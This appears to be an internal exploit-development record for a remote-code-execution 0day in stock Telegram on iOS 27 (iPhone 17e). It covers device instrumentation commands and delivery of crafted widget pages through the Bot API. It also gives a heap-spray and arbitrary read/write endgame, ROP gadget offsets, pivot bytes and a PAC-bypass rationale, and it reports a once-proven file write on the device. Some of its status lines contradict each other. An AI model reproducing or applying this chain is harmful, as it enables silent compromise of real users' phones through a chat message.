# 0day-2-RCE-PARSER-SCOPE / IOS27: iPhone 17e

**ID:** `0day-2-RCE-PARSER-SCOPE/IOS27`  
**Class:** RCE 0day (same parser bug)  
**Platform:** iPhone 17e, iOS 27.0 (24A437), stock Telegram 13.2 (36535)  
**Status:** **device-proven once** (msg 5725); the gated twin is host-only.
**Deliverable:** yes, with the reliability caveat below

> **Post-run update, 2026-11-08.** The parser chain ran on the stock 17e and
> wrote `AppGroup/<APPGROUP>/rce.txt` = 7 bytes `RCE_OK\n` (sha256
> `704984d9…`) on message 5725; the app stayed alive. The winning stage-A
> marker was below the fold and is unknown. The 16:22 marker
> (`HIT=545 LEN=327744 PH=12 VK=598 NT=106`) belongs to another message.
> The proven page is 8,647 B (`payloads/ios27_rel/p0_proven.html`). The gated
> 9,139 B twin and the two-phase detector/final were host-only at the time of
> writing and still need a device run. Sections below that say "prepared, not
> run" are the pre-run record; this box supersedes them.

---


This page is the exact instrumentation procedure for the iPhone 17e
(`iPhone18,5`, iOS 27.0, build 24A437, ECID `<ECID>`, serial
`<SERIAL>`). It is host-side plus the commands the operator runs on the
device. It does not run anything by itself.

The 17e is a **stock** device. There is no jailbreak and no Frida on the
Telegram app. The procedure therefore uses Apple's developer services
(`pymobiledevice3`) and the beta Bot API.

## 1. USB and usbmuxd recovery

Symptoms: the phone enumerates on USB (`05ac:12a8`, bcdDevice 18.05) but
`pymobiledevice3 usbmux list` returns `[]`. The usbmuxd daemon is running and
it reconfigures the phone, but the lockdownd preflight fails.

Known triggers: a stale `pymobiledevice3 usbmux forward --daemonize`, an
abandoned `frida -f`, or an `idund` process. Close them first:

```sh
pkill -f 'pymobiledevice3 usbmux forward' || true
pkill -f '/idund' || true
```

Then wake and unlock the phone. If the "Trust This Computer?" dialog appears,
tap **Trust**. Keep the phone unlocked during the transfer.

The recovery dance (repeat up to three times):

```sh
for i in 1 2 3; do
  sudo -n systemctl stop usbmuxd
  sleep 2
  <HOME>/ailocal/Telegram/ios_sideload/venv/bin/python - <<'PY'
import time
import usb.core
dev = usb.core.find(idVendor=0x05ac, idProduct=0x12a8)
try:
    dev.reset()
    print("reset OK")
except Exception as e:
    print("reset failed:", e)
    for _ in range(4):
        dev = usb.core.find(idVendor=0x05ac, idProduct=0x12a8)
        try:
            dev.set_configuration(3)
            print("set_configuration(3) OK")
            break
        except Exception as e2:
            print("setcfg busy:", e2)
            time.sleep(1.5)
PY
  sudo -n systemctl start usbmuxd
  sleep 5
  if <HOME>/ailocal/Telegram/ios_sideload/venv/bin/pymobiledevice3 \
       usbmux list | grep -q <UDID>; then
    echo RECOVERED
    break
  fi
  echo "attempt $i failed"
done
```

If it still fails, replug the cable with the phone awake and unlocked, then
repeat. `dev.reset()` is the reliable recovery when `set_configuration`
returns "Resource busy". `sudo -n` is passwordless only for
`systemctl {start,stop,restart} usbmuxd` on this host.

After recovery:

```sh
VENV=<HOME>/ailocal/Telegram/ios_sideload/venv/bin
$VENV/pymobiledevice3 usbmux list
$VENV/pymobiledevice3 lockdown info          # ECID, ProductType, BuildVersion
```

Expected: `<UDID>`, `iPhone18,5`, `27.0`, `24A437`.

## 2. Developer mode and the DDI

```sh
$VENV/pymobiledevice3 mounter query-developer-mode-status
$VENV/pymobiledevice3 mounter list
$VENV/pymobiledevice3 mounter auto-mount --userspace
```

Expected: developer mode `true`; `DeveloperDiskImage 642.4` mounted at
`/System/Developer`. iOS 17+ developer services need a tunnel:
`--userspace` (pure Python, no root) or `pymobiledevice3 remote tunneld`.

If `mounter list` is empty, `auto-mount` fetches and mounts the 27.0 (24A437)
image. A Frida "requires an iOS Developer Disk Image" message can be a
transport artifact; re-check `mounter list`.

## 3. Frida: what is possible

| Target | Frida | Why |
|---|---|---|
| Stock `ph.telegra.Telegraph` | **No** | App Store apps have no `get-task-allow`; they cannot embed a Frida gadget. |
| Sideload `com.user.tg72799.B472R2D493` | Yes, through the jailed injector | Dev-signed; instrumentation only, not the stock geometry. |

Do not spend time trying to attach to the stock app. The 6s-style
`debugInsertLocalWidgetMessages` Frida delivery is 6s-only.

## 4. Widget delivery

### Channel B: beta Bot API `sendWidget` (the working path)

`appGroupDataContainer` does **not** resolve for the stock app's group on this
device:

```sh
$VENV/pymobiledevice3 developer core-device read-file appGroupDataContainer \
  "telegram-data/account-<ACCOUNT_ID>/postbox/db/db_sqlite" \
  --identifier group.ph.telegra.Telegraph --userspace
# ContainerLookupErrorDomain ErrorCode 7
```

`appDataContainer` also fails (ErrorCode 3). The Postbox `t7` rewrite is
therefore **unavailable for the stock app**. Use `sendWidget`:

```sh
export BOT_TOKEN='…'   # never commit it
python3 bot/send_widget.py \
  --html vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/probes/probe-h400.html \
  --chat-id <CHAT_ID> \
  --allow-queries --background-query
```

Facts:

- At the time of the run, the beta prefix was required:
  `/beta/bot<TOKEN>/sendWidget`. Both bases now serve `sendWidget`.
- Each call creates a **new message id**. A design that needs the same widget
  id for a storage seed cannot use two `sendWidget` calls. `is_shared` plus
  `sendSharedWidget` shares a widget object across chats; a same-chat
  seed/exploit swap was not tested.
- The bot token used by the Pixel lab server is not available for a second
  `getUpdates` consumer. A delivery-only bot can still send widgets.
- The benign ping widget (`CH17E_PING_20261108_1345`, message 16809) was sent
  this way and executed on the phone.

### Channel A: Postbox `t7` rewrite (not available on the stock 17e)

The tool and procedure exist and are host-tested:
`docs/common/tools/postbox_rewrite_widget.py`. It preserves the `t7` key,
the message id, and the serialization lengths. It is used on a jailbroken 6s
or a device whose AppGroup is readable. On this stock 17e the container lookup
fails before the rewrite.

## 5. Opening the chat

The widget runs when the message is rendered. The app must open the bot chat.

1. **Relaunch to the last chat.** Put the bot chat on screen, kill/relaunch
   the app, and Telegram restores the last chat.
   ```sh
   $VENV/pymobiledevice3 developer core-device launch-application \
     ph.telegra.Telegraph --no-kill-existing --userspace
   ```
2. **`tg://` URL via DVT.** `launchSuspendedProcessWithDevicePath:…options:`
   with `UIApplicationLaunchOptionsURLKey = tg://resolve?domain=<BOT_USERNAME>`.
   This **fails on iOS 27**: the app restarts to the chat list and the
   userspace tunnel drops.
3. **CoreDevice HID + OCR (works).** The universal HID service can tap, type,
   and press. `navigate_chat.py` uses OCR to find the search icon, types the
   bot name, and taps the result. Coordinates are normalized 0-65535.
4. **WDA fallback.** Install a dev-signed WebDriverAgentRunner and use
   `pymobiledevice3 developer wda launch/tap/type/screenshot`.

Delete each probe message with Bot API `deleteMessage` before reopening the
chat. A crashing probe in the chat history kills the app on open.

## 6. Screenshot and marker readback

```sh
$VENV/pymobiledevice3 developer core-device screen-capture screenshot \
  /tmp/opencode/ios17e/shot.png --userspace
$VENV/pymobiledevice3 developer dvt screenshot /tmp/opencode/ios17e/shot2.png --userspace
```

The widget writes its marker into `#v`. Read it with OCR
(`docs/instrumentation/ios17e/ocr_screenshot.py`) or by eye.

App stdout (stage-B `printf`) is captured by relaunching with `--console`:

```sh
$VENV/pymobiledevice3 developer core-device launch-application \
  ph.telegra.Telegraph --console --userspace
```

Run it into a log file and tail it. This is the 17e replacement for the 6s
Frida `printf` hook.

## 7. Crash pull

Crash reports come from the lockdown service and work without the DDI once
usbmux is up:

```sh
$VENV/pymobiledevice3 crash list --userspace
$VENV/pymobiledevice3 crash pull <name>.ips --userspace
```

The file to read first is the `message-widget.0`/`.1` thread and the fault
address. A parser-stage fault at `0x3F48820`/`0x3F487E8` means the far target
left the spray; a fault in the ROP means the chain ran.

## 8. Current state

The device is verified and the tooling is ready. The live RCE run has **not
started**. See `02-status.md`.


---


The 17e is the same parser `ARG_SCOPE_END` bug as the 6s. The stage A primitive
is the same. The stage-B endgame and the ROP constants are iOS 27-specific.

This page describes the payload family. The pre-run status statements below
are historical; the run status is in the box above.

## Stage B on iOS 27

The same-view endgame:

1. Find the class-24 view anchor in the forged `ArrayBuffer`.
2. Re-point `u.array.count` and `u.array.u.ptr` to get arbitrary 64-bit
   read/write.
3. Walk `JSObject → shape → proto → constructor → realm = JSContext`, then
   `ctx+16 = JSRuntime`.
4. Resolve the Mach-O base from `js_free` (`base = js_free - 0x3f4f174`,
   checked with `0xfeedfacf`).
5. For the printf proof: set `rt->mf.js_free = printf`
   (`base+0x557bc20`), point `rt+0x40` at the marker, free a block, and
   `fflush(NULL)`.
6. For the file proof: arm the ROP table and free the trigger buffer.

The same application binary (13.2 / 36535) is used on iOS 15.8.8 and iOS 27.0.
The `js_def_free` and `printf` stubs are the same. The libc deltas differ.

## iOS 27 constants

| Item | Value |
|---|---|
| PIVOT2 | `libcFree + 0xB6583074` = `IntelligenceFlowRuntime + 0x64510` |
| Pivot bytes | `1f 00 00 91 c0 03 5f d6` (`mov sp, x0; ret`) |
| `open` | `+0xB79B52BC` |
| `write` | `+0xB79B3B8C` |
| `pthread_exit` | `−0x88AC` |
| Proof path | `/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/rce.txt` |
| Path length | 91 characters |

The app code is arm64. The pivot is a plain `ret`, so PAC does not
authenticate it. MIE is not enabled for the app (no `checked_allocations` /
`enhanced_security` / `hardened_*` entitlement).

The ROP arm (the same shape as the 6s):

```
rt+0x10 = G_CALL      (base+0x3292c)
rt+0x20 = PIVOT2
rt+0x30 = HUGE
rt+0x40 = 0
```

After arming, no BigInt arithmetic or allocation is allowed. The chain is
built in a `Uint8Array` before the arm. `TRIG = null` frees the trigger, the
pivot runs, and the chain calls:

```
open(path, O_WRONLY|O_CREAT, 0644)
write(fd, "RCE_OK\n", 7)
pthread_exit(0)
```

`pthread_exit` ends the widget thread, not the app. The app should stay alive.

## The prepared payload sequence

The 6s sequence is the template:

1. **Probe.** `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/probes/probe-h400.html` (and H200, H64,
   H500). The probe forges the `ArrayBuffer` and prints the hit marker. It does
   not run stage B.
2. **Attribute probe / final.** `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/attribute/probe-h*.html`
   keeps stage B in a `data-s2` attribute; the final runs it after the forge.
   This avoids the second executable script that shifts the pre-heap.
3. **Storage seed + inline ROP.** `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/storage/seed-stage-b.html`
   stores the 3,617-byte stage B; the same Postbox row is rewritten to
   `storage/inline-rop-h200.html` so the widget id and the storage survive.
   The inline ROP is the 4,300/4,600 pair.
4. **Compile-first variant.** `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/compile-first/` contains
   the prepared `probe-c34.html`, the inline variants, and the ROP variants.
   This geometry compiles the trigger before the spray instead of using holes.
   It is prepared because the 6s hole geometry is not expected to transfer to
   iOS 27's malloc layout.

The prepared set is deliberately redundant. The device decides which geometry
hits.

## H sweep

The hole index `H` is app-heap-state dependent. The prepared probes are H64,
H100, H200, H400, H500. The prepared attribute finals are H64, H200, H400,
H500. The compile-first set has its own pre-heap offsets (p0, p256, p512,
p1024) and ROP variants.

Order for the 17e (when the run starts):

1. `probe-h400` (the 6s device hit geometry).
2. `probe-h200`, `probe-h64`, `probe-h500`.
3. On a hit: the attribute final at the same H.
4. If the attribute final misses, the storage/inline ROP.
5. If the hole geometry never hits, the compile-first probes.

A safe miss is `HIT=-1 LEN=0 PH=-1 VK=-1 NT=25`. A parser-stage crash
(`0x3F48820`/`0x3F487E8`) means the target left the spray; delete the message,
pull the `.ips`, and try the next H.

## Expected markers

| Marker | Meaning |
|---|---|
| `HIT=<i> LEN=327744` | Stage A forged a victim of 327,744 bytes. |
| `HIT=-1 LEN=0 … NT=25` | Safe miss. |
| `ABV k=… D=…` | Stage B found the class-24 anchor. |
| `IOS_N1_OK base=… printf=… rt=…` | Stage B resolved the context/runtime/base and hooked `printf`. |
| `N1IOS_6S_OK` (app console) | The native printf proof. |
| `U_RDY … PATH=…` | The ROP chain is built and the arm is next. |
| `U_NF`, `U_NO_FREE`, `U_NOUB`, `U_EXC` | UB scan or resolver failure. |
| `U_AFTER` | The ROP returned without pivoting (failure). A successful pivot does not return. |
| `rce.txt` = `RCE_OK` | The file proof. Check the mtime. |

The 17e has no Frida `printf` hook. Read `N1IOS_6S_OK` from the
`--console` log and the `#v` marker from a CoreDevice screenshot + OCR.

## Delivery

Use the beta `sendWidget`:

```sh
export BOT_TOKEN='…'
python3 bot/send_widget.py \
  --html vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/probes/probe-h400.html \
  --chat-id <CHAT_ID> \
  --allow-queries --background-query
```

The Postbox `t7` path is not available on this stock device (the AppGroup
lookup fails). See `00-instrumentation.md`.

## Status

The payloads, constants, and tooling are in the tree. The 0day is proven once;
the gated twin is host-only. See the status box at the top.


---


**Status: device-proven once (msg 5725); gated twin host-only.**

The device is verified and the payloads are in the tree. The 0day wrote
`rce.txt` on message 5725 and the app stayed alive. There is no marker for the
winning message and no reliability number. The gated 9,139 B twin, the safe
handshake, and the two-phase path have not been device-proven.

## Device verification

| Item | Value |
|---|---|
| Model | iPhone18,5 |
| OS | iOS 27.0, build 24A437 |
| ECID | `<ECID>` |
| Serial | `<SERIAL>` |
| UDID | `<UDID>` |
| USB | `05ac:12a8`, bcdDevice 18.05 |
| Pairing / Trust | valid |
| Developer mode | true |
| DDI | DeveloperDiskImage 642.4 mounted at `/System/Developer` |
| App | stock `ph.telegra.Telegraph`, Telegram 13.2 (36535) |
| App container | `00000000-0000-0000-0000-000000000000` |
| AppGroup | `00000000-0000-0000-0000-000000000000` |
| App state | installed and running |

The device was re-flashed by the user and re-verified after the flash. The
above is the verified state.

## What is ready

- **USB / usbmuxd recovery**: `sudo -n systemctl stop usbmuxd` → pyusb
  `dev.reset()` (fallback `set_configuration(3)`) → `systemctl start usbmuxd`;
  stale forwarders closed first; Trust/unlock procedure documented.
- **DDI**: `mounter auto-mount --userspace`, DDI 642.4 mounted.
- **Frida**: the stock app is not attachable (no `get-task-allow`); the
  sideload is instrumentation-only. This is documented so no time is wasted.
- **Delivery**: beta Bot API `sendWidget` works. The Postbox `t7` rewrite is
  not available for the stock app because `appGroupDataContainer` fails with
  `ContainerLookupErrorDomain` ErrorCode 7. Bot delivery is the path.
- **Chat-open**: relaunch-to-last-chat and CoreDevice HID + OCR navigation.
  The DVT `tg://` URL launch fails on iOS 27.
- **Screenshot**: CoreDevice `screen-capture screenshot --userspace`; OCR for
  the `#v` marker.
- **Crash pull**: `pymobiledevice3 crash list/pull`.
- **Payloads**: probes, attribute probes/finals, storage seed, inline ROP,
  iOS 27 ROP variants, compile-first variants. See
  `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/payloads/`.
- **Scripts**: delivery, screenshot, OCR, Postbox rewrite, ROP builders,
  `srop` builders. See `vulns/0day-2-RCE-PARSER-SCOPE/IOS27/scripts/`.

## Delivery check (not an exploit result)

A benign ping widget was sent to verify the delivery path:
`CH17E_PING_20261108_1345`, message **16809**, with `allow_queries=true`.
The widget rendered and executed on the phone. This is a delivery check only.
It did not run the parser chain and produced no exploit marker.

## The 5725 run

The 5725 run opened the `<BOT_USERNAME>` chat (chat id `<CHAT_ID>`) with the
canonical 8,647 B page. The marker sequence below is the expected shape; the
winning stage-A marker was not captured.

Expected sequence and markers:

1. **Probe** `probe-h400.html` → `HIT=<i> LEN=327744 PH=<p> VK=598 NT=<n>`.
   A safe miss is `HIT=-1 LEN=0 PH=-1 VK=-1 NT=25`. A parser-stage crash at
   `0x3F48820`/`0x3F487E8` means the target left the spray; pull the `.ips`
   and try the next H.
2. **Attribute probe / final** at the same H → `ABV k=… D=…`, then
   `IOS_N1_OK base=… printf=… rt=…`.
3. **Stage-B printf proof** → `N1IOS_6S_OK` in the `--console` log.
4. **Inline ROP** → `U_RDY … PATH=…`, then the pivot. A success writes
   `/private/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/rce.txt`
   with `RCE_OK` and a fresh mtime. `U_AFTER` means the pivot did not run;
   `U_NF`/`U_NO_FREE`/`U_NOUB` means the UB scan or resolver failed.

The 5725 run produced the marker sequence above. The winning stage-A marker
was not captured. Do not treat the 16:22 message's marker as the 5725 marker.

## What is still missing

- the `#v` stage-A marker of the winning 5725 message;
- a per-attempt reliability number for the 8,647 B page;
- a device run of the gated 9,139 B twin and of the two-phase detector/final;
- the crash `.ips` for the misses, if a clean run is repeated.

The 0day result itself is the `rce.txt` file, not the missing marker.
